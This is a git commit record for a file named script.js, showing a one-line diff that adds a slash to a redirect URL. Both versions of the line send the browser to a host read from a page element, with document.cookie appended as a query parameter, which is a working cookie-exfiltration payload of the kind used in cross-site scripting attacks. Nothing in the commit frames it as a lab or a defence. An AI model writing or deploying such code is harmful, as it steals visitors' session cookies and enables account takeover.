a7f75a01ad22b04b00bdead451dd00784af39316
hyechan Jeon <111348183+kidchanj@users.noreply.github.com>
2022-12-15 21:20:06 +0900

    Update script.js

--- script.js
+++ script.js
@@ -1,2 +1,2 @@
 var url = document.getElementById("JCHAN").value;
-document.location.href="https://"+url+"?Message="+document.cookie;
+document.location.href="https://"+url+"/?Message="+document.cookie;
